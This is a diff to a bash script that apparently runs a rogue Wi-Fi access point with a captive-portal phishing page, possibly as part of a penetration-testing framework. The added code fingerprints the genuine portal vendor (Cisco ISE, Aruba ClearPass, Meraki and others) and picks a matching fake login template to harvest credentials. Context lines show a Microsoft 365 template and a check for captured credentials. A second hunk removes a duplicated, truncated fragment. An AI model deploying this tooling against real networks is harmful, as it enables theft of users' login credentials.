@@ -61,6 +61,40 @@ SERVER_LOG="${EVIDENCE_DIR}/${TC_ID}_server.log"
 HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
 DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 
+# --- Vendor Fingerprinting: detect existing captive portal before taking over ---
+echo -e "${C_ACTION}[*] Probing for existing captive portal vendor...${C_RESET}"
+VENDOR_PROBE_TMP="${EVIDENCE_DIR}/F3_vendor_probe.tmp"
+curl -siL --max-time 5 http://1.1.1.1 > "${VENDOR_PROBE_TMP}" 2>/dev/null || true
+DETECTED_VENDOR="unknown"
+if grep -qiE "identityservicesengine|guestportal|sponsorportal|cisco\.com/auth" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="cisco_ise"
+elif grep -qiE "clearpass|aruba|onguard" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="aruba_clearpass"
+elif grep -qiE "meraki\.com|meraki-splash" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="meraki"
+elif grep -qiE "fgtauth|fortigate|fortiap" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="fortigate"
+elif grep -qiE "ubnt\.com|unifi|guest/s/" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="unifi"
+elif grep -qiE "pfsense|captiveportal" "${VENDOR_PROBE_TMP}"; then
+    DETECTED_VENDOR="pfsense"
+fi
+printf '{"detected_vendor": "%s", "probe_url": "http://1.1.1.1"}\n' "${DETECTED_VENDOR}" > "${EVIDENCE_DIR}/F3_vendor.json"
+echo -e "[+] Detected vendor: ${C_VAR}${DETECTED_VENDOR}${C_RESET}"
+# Auto-select phishing template from detected vendor (only if still using default)
+if [[ "${PHISH_TEMPLATE}" == "generic" ]]; then
+    case "${DETECTED_VENDOR}" in
+        cisco_ise)       PHISH_TEMPLATE="cisco_ise" ;;
+        aruba_clearpass) PHISH_TEMPLATE="aruba" ;;
+        meraki)          PHISH_TEMPLATE="meraki" ;;
+    esac
+    if [[ "${DETECTED_VENDOR}" != "unknown" && "${PHISH_TEMPLATE}" != "generic" ]]; then
+        echo -e "[*] Auto-selected template: ${C_VAR}${PHISH_TEMPLATE}${C_RESET}"
+    fi
+fi
+rm -f "${VENDOR_PROBE_TMP}"
+# --- End vendor fingerprinting ---
+
 if [[ "$PHISH_TEMPLATE" == "m365" ]]; then
     echo -e "[*] Deploying ${C_VAR}Microsoft 365${C_RESET} high-fidelity template..."
     cat <<EOF > "$PHISH_DIR/index.html"
@@ -216,12 +250,6 @@ if grep -qi "CREDENTIALS CAPTURED" "$SERVER_LOG" 2>/dev/null; then
         --target "$SSID" \
         --evidence "$SERVER_LOG" \
         --rationale "Captive portal phishing is a highly effective fallback attack when technical encryption cannot be breached."
-else
-    echo -e "[+] Mission complete. No data harvested."
-fi
-
-exit 0
-n technical encryption cannot be breached."
 else
     echo -e "[+] Mission complete. No data harvested."
 fi
